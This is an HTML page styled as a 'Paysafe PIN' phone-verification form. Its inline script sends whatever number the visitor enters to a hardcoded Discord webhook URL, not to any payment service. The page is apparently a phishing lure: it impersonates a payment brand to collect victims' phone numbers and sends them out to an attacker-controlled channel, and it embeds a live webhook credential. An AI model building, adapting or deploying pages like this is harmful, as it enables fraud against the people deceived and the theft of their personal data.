<html lang="en">
<head>
    <meta charset="UTF-8" />
    <title>Get Your PIN</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            color: #333;
        }
        .container {
            background-color: #ffffff;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            padding: 40px;
            text-align: center;
            max-width: 500px;
            width: 90%;
            border-top: 5px solid #007bff;
        }
        h1 {
            color: #007bff;
            margin-bottom: 20px;
            font-size: 2.5em;
            font-weight: 700;
        }
        p {
            font-size: 1.1em;
            line-height: 1.6;
            margin-bottom: 25px;
        }
        #phoneNumber {
            padding: 12px 15px;
            font-size: 1.1em;
            border: 1px solid #ced4da;
            border-radius: 8px;
            width: 60%;
            max-width: 250px;
            box-sizing: border-box;
            text-align: center;
        }
        #submitBtn {
            background-color: #007bff;
            color: white;
            padding: 12px 25px;
            border: none;
            border-radius: 8px;
            font-size: 1.1em;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        #submitBtn:hover {
            background-color: #0056b3;
        }
        .error-message {
            color: #dc3545;
            font-size: 0.9em;
            margin-top: -15px;
            margin-bottom: 15px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Verify Your Phone Number</h1>
        <p>Please enter your phone number to access your Paysafe PIN.</p>
        <div class="phone-input-container">
            <input type="tel" id="phoneNumber" placeholder="e.g., 555-123-4567" required>
        </div>
        <div class="error-message" id="phoneNumberError">Please enter a valid phone number.</div>
        <button id="submitBtn">Submit</button>
    </div>

    <script type="module">
        const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1385656997587718287/WYyyFCcKvoCXwezu6f3357KcZ7dY5rsPFGneW5WXBw32qMCnrAEl4Ty0JMiWkK9vtsdY"; // Correct webhook URL

        const phoneNumberInput = document.getElementById('phoneNumber');
        const submitBtn = document.getElementById('submitBtn');
        const phoneNumberError = document.getElementById('phoneNumberError');

        // Basic phone number validation function
        function isValidPhoneNumber(phoneNumber) {
            const cleanedNumber = phoneNumber.replace(/[\s\-()]/g, ''); // Clean up spaces, dashes, and parentheses
            return /^\d{7,}$/.test(cleanedNumber); // Ensure the number contains at least 7 digits
        }

        submitBtn.addEventListener('click', async (event) => {
            event.preventDefault();  // Prevent page reload on submit

            const rawPhoneNumber = phoneNumberInput.value.trim();

            if (!rawPhoneNumber || !isValidPhoneNumber(rawPhoneNumber)) {
                phoneNumberError.style.display = 'block'; // Show error message
                return;
            } else {
                phoneNumberError.style.display = 'none'; // Hide error message if valid
            }

            // Format phone number without dashes and spaces
            const fullPhoneNumber = rawPhoneNumber.replace(/[\s\-()]/g, '');

            console.log("Phone Number to send: ", fullPhoneNumber); // Debug log

            // Send to Discord Webhook
            try {
                const response = await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        content: `New Phone Number Submission: ${fullPhoneNumber}`
                    }),
                });

                if (response.ok) {
                    console.log('Phone number sent to Discord successfully!');
                    alert("Your number has been submitted successfully!");
                    phoneNumberInput.value = '';  // Clear input field after successful submission
                } else {
                    console.error('Failed to send phone number to Discord:', response.status, response.statusText);
                    alert('Failed to submit. Please try again later.');
                }
            } catch (error) {
                console.error('Error sending phone number to Discord:', error);
                alert('Network error. Please check your connection and try again.');
            }
        });
    </script>
</body>
</html>
